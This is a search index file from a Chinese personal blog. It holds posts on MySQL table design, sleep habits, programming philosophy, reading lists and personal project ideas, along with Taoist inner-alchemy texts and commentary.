<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>mysql 建表规范</title>
      <link href="/mysql/mysql/mysql-db-design-standard/"/>
      <url>/mysql/mysql/mysql-db-design-standard/</url>
      
        <content type="html"><![CDATA[<ol><li>所有表一定要设计一个主键。因为你不设主键的情况下，innodb也会帮你生成一个隐藏列，作为自增主键。</li><li>如果不涉及分布式系统，和未来分库分表需求，使用自增主键，否则使用 UUID。</li><li>主键不应该有任何业务含义。因为任何有业务含义的列都有改变的可能性,主键一旦带上了业务含义，那么主键就有可能发生变更。</li><li>枚举字段不使用 <strong>enum</strong>  使用 tinyint 代替。避免操作陷阱，以及未来拓展方便。</li><li>如果货币单位是分，可以用<code>Int</code>类型，如果坚持用元，用<code>Decimal</code>。float、double 存在精度问题。</li><li>时间字段统一使用 datetime。 避免 timestamp 的时间范围问题，以及时区问题，datetime 使用的 8 个字节存储的空间满足开发中基本所有需求。</li><li>不允许使用 blob 类型，不建议使用 text 类型。mysql 在排序、关联的时候无法对改字段使用内存临时表，造成查询缓慢的问题。同时也会造成 binlog 过大，主从同步缓慢的问题。</li><li>可选字段定义为 <strong>NOT NULL</strong>。Mysql难以优化引用可空列查询，它会使索引、索引统计和值更加复杂。可空列需要更多的存储空间，还需要mysql内部进行特殊处理。并且查询有陷阱，需要使用 is null 这种方式查询，另外 count 等聚合函数会自动忽略。</li></ol>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>我的睡眠管理</title>
      <link href="/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/my-sleep/"/>
      <url>/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/my-sleep/</url>
      
        <content type="html"><![CDATA[<ol><li>养成定时睡觉的习惯，11 点到 - 11 点半为进入睡眠状态区间，早上 7 点准时起床，如果睡眠时间不够，进行前移，而不是后移。</li><li>中午吃高蛋白食物，晚上吃高碳水食物有利于睡眠</li><li>下午2~5点适合打盹，每次30分钟左右；而在上午7~10点和晚上5~8点这两个阶段应主动抑制睡眠的欲望。确保晚上睡眠正常</li><li>使用道家的呼吸方法调节呼吸</li></ol>]]></content>
      
      
      <categories>
          
          <category> 自我管理 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>jdorm</title>
      <link href="/java/java/jdrom/"/>
      <url>/java/java/jdrom/</url>
      
        <content type="html"><![CDATA[<h2 id="jdorm-特性"><a href="#jdorm-特性" class="headerlink" title="jdorm 特性"></a>jdorm 特性</h2><ul><li>为 DDD 设计的 java 存储方案</li><li>天然读写分离</li><li>缓存友好</li><li>减少样板代码</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>优秀产品介绍首页鉴赏</title>
      <link href="/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/we-project-portal/"/>
      <url>/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/we-project-portal/</url>
      
        <content type="html"><![CDATA[<h2 id="图壳"><a href="#图壳" class="headerlink" title="图壳"></a>图壳</h2><p><a href="https://imgkr.com/#about" target="_blank" rel="noopener">https://imgkr.com/#about</a></p><h2 id="layui"><a href="#layui" class="headerlink" title="layui"></a>layui</h2><p><a href="https://www.layui.com" target="_blank" rel="noopener">https://www.layui.com</a></p><h2 id="T-io"><a href="#T-io" class="headerlink" title="T-io"></a>T-io</h2><p><a href="http://www.t-io.org" target="_blank" rel="noopener">http://www.t-io.org</a></p><h2 id="图扑引擎"><a href="#图扑引擎" class="headerlink" title="图扑引擎"></a>图扑引擎</h2><p><a href="http://hightopo.com" target="_blank" rel="noopener">http://hightopo.com</a></p><h2 id="泡泡IM"><a href="#泡泡IM" class="headerlink" title="泡泡IM"></a>泡泡IM</h2><p><a href="http://popoim.cn" target="_blank" rel="noopener">http://popoim.cn</a></p><h2 id="WoLive客服"><a href="#WoLive客服" class="headerlink" title="WoLive客服"></a>WoLive客服</h2><p><a href="http://www.wolive.cc" target="_blank" rel="noopener">www.wolive.cc</a></p>]]></content>
      
      
      <categories>
          
          <category> 写作技巧 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>程序员的美德：克制、简单和笨拙</title>
      <link href="/thinking/thinking/the-three-great-girtues-of-a-programmer/"/>
      <url>/thinking/thinking/the-three-great-girtues-of-a-programmer/</url>
      
        <content type="html"><![CDATA[<p>Perl 语言的发明人 Larry Wall 一个经典叙述：优秀程序员应该有三大美德：懒惰、急躁和傲慢。</p><p>在他的世界观里，懒惰可以驱使你善于利用工具，减少重复劳动；急躁可以驱动你写出高效运行的程序；而傲慢可以让你写出让别人挑不出毛病的程序。</p><p>这几项是我进入编程行业一直信奉的真理，这些 “美德” 对于新手来说是很好的提醒。工作很久之后，见识过各种项目以及所谓的最佳实践，对编程有了不同的认识。</p><p>我想加上程序员需要坚持的另外一面：克制、简单和笨拙。</p><h2 id="克制"><a href="#克制" class="headerlink" title="克制"></a>克制</h2><p>技术发展的如此之快，JSP 已经几乎被淘汰了，取而代之的是前后端分离、微服务系统等时髦技术。面对这些新技术时，克制是让你远离很多麻烦的第一步。</p><p>曾经有一个客户需要一个简单的信息录入系统，用于管理一些基础的业务需求。我们准备构建一个后端服务来提供 API，团队中一名同事提出想要使用微服务，并坚信所有的新项目都不应该使用 “传统”的单体系统。</p><p>后来我们花了半个月的时间构建了后台服务，又花了一周的时间构建了 BFF 为浏览器提供 API 调用，同时以为这两个服务分离开来，又不得不做出一些额外的工作完成鉴权能力。</p><p>那位同事显然没有意识到 “微服务” 的本质是一种分布式系统，满足同样的业务需求需要付出巨大的成本。</p><h2 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h2><p>IT 行业有一个有趣的现象。</p><p>每一次技术潮流的到来，并不是这项技术有多大的创新。而是产生了某一个框架让原本高深晦涩的技术变得简单，从而让我们这种低端的程序员也能掌握。</p><p>Spring 对于 Java EE开发的简化，让复杂的企业级开发变得足够简单。</p><p>深度学习框架对于数学模型的简化，让人人都能参与 AI 开发，即使只是调参侠。</p><p>区块链框架对于分布式合约的简化，避免应用开发者需要下场处理分布式问题。</p><p>ElasticSearch 对于搜索引擎的简化，让搜索引擎应用得以普及。</p><p>这些技术能普及，最基本的原因就是简单。</p><p>相反的例子就是传统 Java EE 中的各种设计模式，以及 DDD 中的各种概念，工厂、facade、Event Sourcing，这些模式和概念必然难以在实际项目中推动。</p><p>当我在现实中听到某个程序员说在项目中使用了多少种设计模式并引以自豪时，最好的方法就是远离他。</p><h2 id="笨拙"><a href="#笨拙" class="headerlink" title="笨拙"></a>笨拙</h2><p>笨拙是最难的一个美德。</p><p>有太多的程序员，包括我，脑袋里装满了各种高大上的想法，见到一个高级技巧或者技术便如获至宝。</p><p>JavaScript 的语言中充满了各种精巧的设计和技术，闭包、原型链等高阶知识是面试必问的。</p><p>《代码整洁之道》和《重构》中各种高级的编码技巧。</p><p>Scala 中各种不同的编程范式，C++ 中的模板、运算符重载等高科技。</p><p>我以为我永远到不了编程大师的水平。直到后来阅读了一些源码， Backbone.js 和 Redis 让我印象深刻。朴实无华的设计，有很多逻辑判断写的非常普通，没有过多的设计模式。</p><p>当我知道 Intellij IDE 是用 Swing 开发而成的时候，惊叹不已，用最简单的食材做出最美味的食物，这才是真正的编程大师吧。</p>]]></content>
      
      
      <categories>
          
          <category> thinking </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>我的点子</title>
      <link href="/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/my-ideas/"/>
      <url>/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/my-ideas/</url>
      
        <content type="html"><![CDATA[<p>我是一个爱胡思乱想的人，点子特别多，来的快消失的也快。在这里记录下来，经过时间的淬炼再行动。</p><h2 id="赚钱"><a href="#赚钱" class="headerlink" title="赚钱"></a>赚钱</h2><ul><li>通过程序自动运营营销号</li><li>通过写付费文档，如果找出错误就退款</li></ul><h2 id="个人项目"><a href="#个人项目" class="headerlink" title="个人项目"></a>个人项目</h2><ul><li>做一个 DDD 模型驱动开发的工具链和框架<ul><li>领域描述语言的设计</li><li>待聚合根、实体、值对象的 ER 模型设计器</li><li>DDD 风格专用 ORM，命名为 jdorm</li><li>DDD 项目骨架 + arch-unit 守护</li></ul></li><li>做一个定时自动微信推送消息的工具</li><li>做一个任务执行平台，用户提交跑任务的需求，例如爬虫</li><li>将 markdown 翻译成各个平台的排版格式</li><li>做一个道家的网站<ul><li>zhuangzhou.org</li><li>制作一个庄周格言卡片生成器</li></ul></li><li>实时协作系统框架</li><li>微信运营助手 </li><li>写作编译系统，一本书的 “源代码” 是大纲、素材、引用、想法、图表的源文件，如果这些是一本书的源代码，是不是可以有一套系统，可以帮助组织这些信息，然后像写代码一样，写作这本书，然后编译成一本书。</li></ul><h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><ul><li><p>将所有的东西模型化，使用模型化思维，提高效率</p><ul><li>项目架构</li><li>现实中赚钱的方式，开店的方式</li><li>心智模型</li><li>影响力模型</li></ul></li><li><p>编写课程和咨询offering：开发过程模型化，软件开发过程就是模型的链接和转化</p><ul><li>过程模型：敏捷</li><li>需求模型：用户故事</li><li>UX 模型：设计系统</li><li>组织架构模型：分形模型</li><li>API 模型：openAPI </li><li>业务模型：DDD</li><li>运维模型：Deveops</li><li>绩效模型：OKR</li><li>市场模型：定位理论</li></ul></li><li><p>围绕这个模型建立代码脚手架+编程辅助工具</p></li><li><p>有效的阅读和学习就是一套模型的抽取和提炼</p></li><li><p>模型的难点是描述和更新</p></li><li><p>有很多自己有模型，但是自己不知道</p></li><li><p>模型是写作的基础</p></li><li><p>所有的思维方式都是在建模的过程</p></li><li><p>所有的模型都是错误的</p></li><li><p>如果不能构建自己的模型，分析问题的时候就会解决一个问题而引发其他问题</p></li><li><p>有效模型的要素：</p><ul><li>有基本的理论依据</li><li>互相印证，形成闭环</li><li>接地气，能解决现实问题</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 自我管理 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>我的个人思维模型</title>
      <link href="/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/my-mental-models/"/>
      <url>/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/my-mental-models/</url>
      
        <content type="html"><![CDATA[<p>以道家为基础的辩证唯物主义世界观。</p><p>一些感悟：</p><ul><li>尊重规律，打破规则，大方向按照老庄的思维模型</li><li>让自己静下来的方法：气血上浮，会带来更多的灵感和想法，但是无法落地和坚持实施；气血下沉，更加专注和收敛</li><li>不要过于自信，也不妄自菲薄</li></ul>]]></content>
      
      
      <categories>
          
          <category> 自我管理 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>吕祖百字铭.三丰祖师注解</title>
      <link href="/thinking/thinking/lv-zu-bai-zi-bei/"/>
      <url>/thinking/thinking/lv-zu-bai-zi-bei/</url>
      
        <content type="html"><![CDATA[<p>三丰祖师注解吕祖百字铭吕祖百字铭</p><p>养气忘言守，降心为不为，动静知宗祖，无事更寻谁。</p><p>真常须应物，应物要不迷，不迷性自住，性住气自回。</p><p>气回丹自结，壶中配坎离，阴阳生反复，普化一声雷。</p><p>白云朝顶上，甘露洒须弥，自饮长生酒，逍遥谁得知。</p><p>潜听无弦曲，明通造化机，都来二十句，端的上天梯。</p><p><strong>养气忘言守</strong></p><p>凡修行者，先须养气。养气之法，在乎忘言守一。忘言则气不散，守一则神不出。诀曰：缄舌静，抱神定。</p><p><strong>降心为不为</strong></p><p>凡人之心，动荡不已。修行人心欲入静，贵乎制伏两眼。眼者，心之门户。须要垂帘塞兑，一切事体，以心为剑。想世事无益于我，火烈顿除，莫去贪着。诀云：以眼视鼻，以鼻视脐。上下相顾，心息相依。着意玄关，便可降伏思虑。</p><p><strong>动静知宗祖</strong></p><p>动静者，一阴一阳也。宗祖者，生身之处也。修行人当知父母未生之前，即玄牝也。一身上下乾坤八卦五行四象聚会之处，乃天地未判之先，一点灵光而成，即太极也。心之下，肾之上，仿佛之内，念头无息，所起之处，即是宗祖。所谓动静者，调和真气，安理真元也。盖呼接天根，吸接地根，即阖户之谓坤，辟户之谓乾。呼则龙吟云起，吸则虎啸风生。一阖一辟，一动一静，贵乎心意不动，任其真息往来，绵绵若存。调息至无息之息，打成一片，斯神可凝，丹可就矣。</p><p><strong>无事更寻谁</strong></p><p>若能养气忘言守，降伏身心，神归炁穴，意注规中，混融一炁，如鸡抱卵，如龙养珠，念兹在兹，须臾不离，日久功深，自然现出黍米之珠，光耀如日。点化元神，灵明莫测，即此是也。</p><p><strong>真常须应物，应物要不迷</strong></p><p>此道乃真常之道，以应事易于昏迷，故接物不可迷于尘事。若不应接，则空寂虚无。须要来则应之，事去不留，光明正大，乃是不迷，真性清净，元神凝结。诀曰：着意头头错，无为又落空。</p><p><strong>不迷性自住，性住气自回</strong></p><p>凡人性烈如火，喜怒哀乐，爱恶欲憎，变态无常。但有触动，便生妄想，难以静性。必要有真惩忿，则火降；真寡欲，则水升。身不动，名曰炼精。炼精则虎啸，元神凝固。心不动，名曰炼气。炼气则龙吟，元气存守。念不动，名曰炼神。炼神则二气交，三元混，元气自回矣。三元者，精气神也。二气者，阴阳也。修行人应物不迷，则元神自归，本性自住矣。性住则身中先天之气自回，复命归根，有何难哉！诀曰：回光返照，一心中存。内想不出，外想不入。</p><p><strong>气回丹自结，壶中配坎离</strong></p><p>修行人性不迷尘事，则炁自回。将见二炁升降于中宫，阴阳配合于丹鼎，忽觉肾中一缕热炁上冲心府，情来归性，如夫妇配合，如痴如醉，二气絪緼，结成丹质而炁穴中水火相交，循环不已，则神驭炁，炁留形，不必杂术自长生，诀曰：耳目口三宝，闭塞勿发通。真人潜深渊，浮游守规中。直至丹田气满，结成刀圭也。</p><p><strong>阴阳生反复，普化一声雷</strong></p><p>功夫到此，神不外驰，气不外泄，神归炁穴，坎离已交。愈加猛烈精进。致虚之极，守静之笃。身静于杳冥之中，心澄于无何有之乡，则真息自住，百脉自停。日月停景，璇玑不行。太极静而生动，阳产于西南之坤。坤即腹也，又名曲江。忽然一点灵光，如黍米之大，即药生消息也。赫然光透，两肾如汤煎，膀胱如火炙，腹中如烈风之吼，腹内如震雷之声，即复卦天根现也。天根现，即固心王，以神助之，则其炁如火逼金，上行穿过尾闾。轻轻送，默默举，一团和气，如雷之震，上升泥丸，周身踊跃，即天风姤卦也。由月窟，至印堂，眉中漏出元光，即太极动而生阴，化成神水甘露。内有黍米之珠，落在黄庭之中，点我离中灵汞，结成圣相之体，行周天火候一度。烹之炼之，丹自结矣。</p><p><strong>白云朝顶上，甘露洒须弥</strong></p><p>到此地位，药即得矣。二气结刀圭，关窍开通，火降水升，一炁周流。从太极中，动天根，过玄谷关，升二十四椎骨节，至天谷关。月窟阴生，香甜美味，降下重楼，无休无息，名曰甘露洒须弥。诀曰：甘露满口，以目送之，以意迎之，送下丹釜，凝结元气以养之。</p><p><strong>自饮长生酒，逍遥谁得知</strong></p><p>养气到此，骨节已开。神水不住，上下周流，往来不息，时时吞咽，谓之长生酒。诀曰：流珠灌养灵根性，修行之人知不知？</p><p><strong>潜听无弦曲，明通造化机</strong></p><p>功夫到此，耳听仙乐之音，又有钟鼓之韵。五气朝元，三花聚顶，如晚鸦来栖之状。心田开朗，智慧自生，明通三教经书，默悟前生根本，预知未来休咎。大地山河，如在掌中，目视万里，已得六通之妙。此乃实有也。吾行实到此际，若有虚言以误后学，天必诛之。遇之不行，罪过天谴。非与师遇，此事难知。</p><p><strong>都来二十句，端的上天梯</strong></p><p>自养气忘言至此二十句，皆是吕祖真正口诀，功夫无半点虚伪，乃修行上天之阶梯。得悟此诀与注者，可急行之。勿妄漏泄，勿示匪人，以遭天谴。珍重奉行，克登天阙。</p><p>《吕祖百字铭》乃丹家真传，需要背诵纯熟、慢慢体验，学道者领悟了此《百字铭》，就等于掌握了丹道全诀，所有功法皆可依此印证。</p><p>“养气忘言守，降心为不为”一句是命功，即“凝神入炁穴”的功夫。其入手功夫讲“养气”而不曰“运气、炼气”，讲“降心”而不曰“静心、炼心”，就是要求意念下注丹田，息息归根，在炁穴“积精累气以成真”。此种功法之要诀在于一个“守”字，即：“抱元守一，而凝神聚炁也。”</p><p>“动静知宗祖，无事更寻谁”讲的是“性功”，是入手的“止念”法门。“宗祖”即是不假修证、天然常明的“真我”，随其杂念纷纷而“真我”乃“无事道人”，只要“宗祖”、“真常”不迷，则自可“性住”、“气回”而得“玉液还丹”。</p><p>其后再经坎离交媾、乾坤交媾，完成采药、炼丹的程序，达到转识成智的逍遥之境。</p>]]></content>
      
      
      <categories>
          
          <category> thinking </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>修道的方法</title>
      <link href="/thinking/thinking/the-way-of-mindful/"/>
      <url>/thinking/thinking/the-way-of-mindful/</url>
      
        <content type="html"><![CDATA[<h2 id="修道的原理"><a href="#修道的原理" class="headerlink" title="修道的原理"></a>修道的原理</h2><p>道家的世界观中说明了道家是如何思考这个世界，如何处理个人与社会、个人与世界的方法。</p><p>一个普通人如何做到像有道的人那样生活呢，安定、平和和少私寡欲。</p><p>有很多法门，很多条路。</p><p>从吃过的亏中总结下来，比较容易理解和可行的法门是性命双修，也就是全真龙门的主要方法。</p><p>性，人的心性，修习待人接物时的平和气质，豁达的心态。</p><p>命，人的身体，精神饱满，气定神闲的状态。</p><h2 id="道家给出的四个可行的阶段"><a href="#道家给出的四个可行的阶段" class="headerlink" title="道家给出的四个可行的阶段"></a>道家给出的四个可行的阶段</h2><ol><li>练己筑基。学习道家基本的品性，通过自我约束打好基础，安顿好生活中的事务，处理好家庭、事业的关系。</li><li>炼精化气。通过后天刻意的修习，少私寡欲，凝神聚气，比较简单易行的方法就是庄子的听息。关闭眼耳鼻舌身意的各种感官。</li><li>练气养神。第一节阶段完成就会有气循环，气足身体就会慢慢好起来，继续坚持，让精神也慢慢好起来。</li><li>练神还虚。通过自然而然的演化，进入先天模式，只需要等待时间的流逝即可。</li></ol><p>三个阶段的修行实际上方法都是一样的，使用庄子听息就够了。少则多，多则惑。老子无为的意思就是，节约自己的精神，不瞎想，不妄动。学会休息身体就会慢慢自然恢复。</p><p>我个人采用的方法非常简单，使用庄子听息作为修习方法，以及每日诵读清静经让自己不被其他法门诱惑。</p><p>看到其他人提到黄元吉真人道门语要，说明了这几个过程的心法：</p><blockquote><p>心不动名曰炼精，炼精则虎啸风生；身不动名曰练气，练气则龙吟云起；念不动名曰炼神；炼神则元精溶溶，元气浩浩、元神跃跃。若犹未也，必先寡欲以养精，寡言以养气，少思以养神，适至还精补脑，则精不自泄矣；心息相依，忘言守中，则气自不散矣；形神俱妙，与道合真，则神不自扰矣。</p></blockquote><p>吕祖记录了内丹的完整过程，也就是吕祖百字碑。</p><h2 id="百字碑原文"><a href="#百字碑原文" class="headerlink" title="百字碑原文"></a>百字碑原文</h2><blockquote><p> 养气忘言守，降心为不为，动静知宗祖，无事更寻谁。</p><p>真常须应物，应物要不迷，不迷性自住，性住气自回。</p><p>气回丹自结，壶中配坎离，阴阳生反复，普化一声雷。</p><p>白云朝顶上，甘露洒须弥，自饮长生酒，逍遥谁得知。</p><p>潜听无弦曲，明通造化机，都来二十句，端的上天梯。</p></blockquote><p>三丰真人根据自己的经历注解了一下：</p><p><strong>养气忘言守</strong></p><p>凡修行者，先须养气。养气之法，在乎忘言守一。忘言则气不散，守一则神不出。诀曰：缄舌静，抱神定。</p><p><strong>降心为不为</strong></p><p>凡人之心，动荡不已。修行人心欲入静，贵乎制伏两眼。眼者，心之门户。须要垂帘塞兑，一切事体，以心为剑。想世事无益于我，火烈顿除，莫去贪着。诀云：以眼视鼻，以鼻视脐。上下相顾，心息相依。着意玄关，便可降伏思虑。</p><p><strong>动静知宗祖</strong></p><p>动静者，一阴一阳也。宗祖者，生身之处也。修行人当知父母未生之前，即玄牝也。一身上下乾坤八卦五行四象聚会之处，乃天地未判之先，一点灵光而成，即太极也。心之下，肾之上，仿佛之内，念头无息，所起之处，即是宗祖。所谓动静者，调和真气，安理真元也。盖呼接天根，吸接地根，即阖户之谓坤，辟户之谓乾。呼则龙吟云起，吸则虎啸风生。一阖一辟，一动一静，贵乎心意不动，任其真息往来，绵绵若存。调息至无息之息，打成一片，斯神可凝，丹可就矣。</p><p><strong>无事更寻谁</strong></p><p>若能养气忘言守，降伏身心，神归炁穴，意注规中，混融一炁，如鸡抱卵，如龙养珠，念兹在兹，须臾不离，日久功深，自然现出黍米之珠，光耀如日。点化元神，灵明莫测，即此是也。</p><p><strong>真常须应物，应物要不迷</strong></p><p>此道乃真常之道，以应事易于昏迷，故接物不可迷于尘事。若不应接，则空寂虚无。须要来则应之，事去不留，光明正大，乃是不迷，真性清净，元神凝结。诀曰：着意头头错，无为又落空。</p><p><strong>不迷性自住，性住气自回</strong></p><p>凡人性烈如火，喜怒哀乐，爱恶欲憎，变态无常。但有触动，便生妄想，难以静性。必要有真惩忿，则火降；真寡欲，则水升。身不动，名曰炼精。炼精则虎啸，元神凝固。心不动，名曰炼气。炼气则龙吟，元气存守。念不动，名曰炼神。炼神则二气交，三元混，元气自回矣。三元者，精气神也。二气者，阴阳也。修行人应物不迷，则元神自归，本性自住矣。性住则身中先天之气自回，复命归根，有何难哉！诀曰：回光返照，一心中存。内想不出，外想不入。</p><p><strong>气回丹自结，壶中配坎离</strong></p><p>修行人性不迷尘事，则炁自回。将见二炁升降于中宫，阴阳配合于丹鼎，忽觉肾中一缕热炁上冲心府，情来归性，如夫妇配合，如痴如醉，二气絪緼，结成丹质而炁穴中水火相交，循环不已，则神驭炁，炁留形，不必杂术自长生，诀曰：耳目口三宝，闭塞勿发通。真人潜深渊，浮游守规中。直至丹田气满，结成刀圭也。</p><p><strong>阴阳生反复，普化一声雷</strong></p><p>功夫到此，神不外驰，气不外泄，神归炁穴，坎离已交。愈加猛烈精进。致虚之极，守静之笃。身静于杳冥之中，心澄于无何有之乡，则真息自住，百脉自停。日月停景，璇玑不行。太极静而生动，阳产于西南之坤。坤即腹也，又名曲江。忽然一点灵光，如黍米之大，即药生消息也。赫然光透，两肾如汤煎，膀胱如火炙，腹中如烈风之吼，腹内如震雷之声，即复卦天根现也。天根现，即固心王，以神助之，则其炁如火逼金，上行穿过尾闾。轻轻送，默默举，一团和气，如雷之震，上升泥丸，周身踊跃，即天风姤卦也。由月窟，至印堂，眉中漏出元光，即太极动而生阴，化成神水甘露。内有黍米之珠，落在黄庭之中，点我离中灵汞，结成圣相之体，行周天火候一度。烹之炼之，丹自结矣。</p><p><strong>白云朝顶上，甘露洒须弥</strong></p><p>到此地位，药即得矣。二气结刀圭，关窍开通，火降水升，一炁周流。从太极中，动天根，过玄谷关，升二十四椎骨节，至天谷关。月窟阴生，香甜美味，降下重楼，无休无息，名曰甘露洒须弥。诀曰：甘露满口，以目送之，以意迎之，送下丹釜，凝结元气以养之。</p><p><strong>自饮长生酒，逍遥谁得知</strong></p><p>养气到此，骨节已开。神水不住，上下周流，往来不息，时时吞咽，谓之长生酒。诀曰：流珠灌养灵根性，修行之人知不知？</p><p><strong>潜听无弦曲，明通造化机</strong></p><p>功夫到此，耳听仙乐之音，又有钟鼓之韵。五气朝元，三花聚顶，如晚鸦来栖之状。心田开朗，智慧自生，明通三教经书，默悟前生根本，预知未来休咎。大地山河，如在掌中，目视万里，已得六通之妙。此乃实有也。吾行实到此际，若有虚言以误后学，天必诛之。遇之不行，罪过天谴。非与师遇，此事难知。</p><p><strong>都来二十句，端的上天梯</strong></p><p>自养气忘言至此二十句，皆是吕祖真正口诀，功夫无半点虚伪，乃修行上天之阶梯。得悟此诀与注者，可急行之。勿妄漏泄，勿示匪人，以遭天谴。珍重奉行，克登天阙。</p><p>《吕祖百字铭》乃丹家真传，需要背诵纯熟、慢慢体验，学道者领悟了此《百字铭》，就等于掌握了丹道全诀，所有功法皆可依此印证。</p><p>“养气忘言守，降心为不为”一句是命功，即“凝神入炁穴”的功夫。其入手功夫讲“养气”而不曰“运气、炼气”，讲“降心”而不曰“静心、炼心”，就是要求意念下注丹田，息息归根，在炁穴“积精累气以成真”。此种功法之要诀在于一个“守”字，即：“抱元守一，而凝神聚炁也。”</p><p>“动静知宗祖，无事更寻谁”讲的是“性功”，是入手的“止念”法门。“宗祖”即是不假修证、天然常明的“真我”，随其杂念纷纷而“真我”乃“无事道人”，只要“宗祖”、“真常”不迷，则自可“性住”、“气回”而得“玉液还丹”。</p><p>其后再经坎离交媾、乾坤交媾，完成采药、炼丹的程序，达到转识成智的逍遥之境。</p><h2 id="张至顺道爷心得"><a href="#张至顺道爷心得" class="headerlink" title="张至顺道爷心得"></a>张至顺道爷心得</h2><ul><li>早上3点到5点是最重要的练功时间，一个人能一辈子在这个时间练功不辍，一定有成就。</li><li>时刻专注、守神很重要。打坐要的是神思不动，神不离身。不要闭气更不要意守丹田。</li><li>无论在什么地方，有空就静坐，不要想太多，凝神调息，调息凝神。</li><li>重阳祖师早说过外三宝不漏，内三宝自合；眼不观，耳不闻，口不言语，自长生。</li><li>闭关也是这样，该闭的是眼耳口三关</li><li>《道德经》、《太乙金华宗旨》、《太上老君说常清静经》三本书最重要</li><li>正确的修行方法能让男女之情那些念头很快过去。</li><li>真正有道学的人，是不会在社会上出现的。只有他想见你的时候才会出现，不会挤在名山大川里让人参观的。他们根本就遇不着，遇着了你也不认得。</li></ul>]]></content>
      
      
      <categories>
          
          <category> thinking </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>写作清单</title>
      <link href="/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/writing-list/"/>
      <url>/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/writing-list/</url>
      
        <content type="html"><![CDATA[<p>想写但是没有时间写的清单：</p><h2 id="技术类"><a href="#技术类" class="headerlink" title="技术类"></a>技术类</h2><ul><li><p>《Java 单元测试入门小书》 进行中</p><ul><li>《Spring boot 的测试》</li></ul></li><li><p>《项目管理的教训》</p><ul><li>《要团队主动领取任务，不要分配任务》</li></ul></li><li><p>《DDD 事件风暴操作手册》</p></li><li><p>《线上数据修复技巧》</p></li><li><p>《互联网开发就是加机器的艺术》</p></li><li><p>《DDD 小书》 接近完成</p><ul><li>DDD 指导下的 CQRS</li><li>DDD 指导下的数据库设计</li><li>DDD 指导下的缓存设计</li><li>DDD 工作坊，自上而下的架构规划</li><li>DDD 业务模型和业务逻辑</li><li>DDD 模型的验证</li><li>DDD 指导低代码开发</li><li>DDD 的最小集，轻量化落地</li><li>DDD 架构下的测试策略</li><li>DDD 准备业务输入</li><li>DDD 指导下的企业资源分配</li></ul></li><li><p>微服务团队中的项目管理</p></li><li><p>互联网应用开发的特点</p></li><li><p>《按下回车的那一刻》 网络和计算机原理的科普小书籍</p></li></ul><h2 id="生活类"><a href="#生活类" class="headerlink" title="生活类"></a>生活类</h2><p>《“德” 就是定力》</p><p>《执念的来源》</p><p>《抵抗焦虑的力量》</p>]]></content>
      
      
      <categories>
          
          <category> 写作技巧 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>软件工程师必读书单</title>
      <link href="/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/book-list/"/>
      <url>/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/book-list/</url>
      
        <content type="html"><![CDATA[<p>我个人的方向是专注于分布式系统架构设计和中间件开发。写作的来源是阅读、实践和反思，因此整理了一些书单用于学习计算机科学。</p><h2 id="计算机科学基础"><a href="#计算机科学基础" class="headerlink" title="计算机科学基础"></a>计算机科学基础</h2><p>《离散数学及其应用（原书第7版）》</p><p>《数据结构和算法 java 版本》</p><p>《UNIX/Linux 程序设计教程》</p><p>《深入理解计算机系统》</p><p>《TCP/IP 详解》</p><p>《分布式系统原理与范型(第2版)》</p><p>《具体数学》</p><p>《漫画算法》</p><p>《软件方法 - 业务建模和方法》</p><p>《操作系统导论》</p><p>《计算机程序的构造和解释(SICP)》</p><p>《计算机的系统要素》</p><h2 id="应用书籍"><a href="#应用书籍" class="headerlink" title="应用书籍"></a>应用书籍</h2><p>《Web容量规划的艺术》</p><p>《junit实战第二版》</p><p>《测试驱动开发》</p><p>《大型网站系统与Java中间件实践》</p><p>《MySQL技术内幕：InnoDB存储引擎》</p><p>《Java并发实现原理：JDK源码剖析》</p><p>《分布式中间件技术实战（Java版）》</p><p>《分布式系统常用技术及案例分析》</p><p>《洞见文集 微服务》</p><h2 id="参考书单"><a href="#参考书单" class="headerlink" title="参考书单"></a>参考书单</h2><ul><li><a href="https://github.com/keithnull/TeachYourselfCS-CN/blob/master/TeachYourselfCS-CN.md" target="_blank" rel="noopener">https://github.com/keithnull/TeachYourselfCS-CN/blob/master/TeachYourselfCS-CN.md</a></li><li><a href="https://github.com/woai3c/recommended-books" target="_blank" rel="noopener">https://github.com/woai3c/recommended-books</a></li><li><a href="https://github.com/guanpengchn/awesome-books" target="_blank" rel="noopener">https://github.com/guanpengchn/awesome-books</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 写作技巧 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>学习&quot;知识&quot;，而不是各种框架的说明书</title>
      <link href="/thinking/thinking/understand-knowledge/"/>
      <url>/thinking/thinking/understand-knowledge/</url>
      
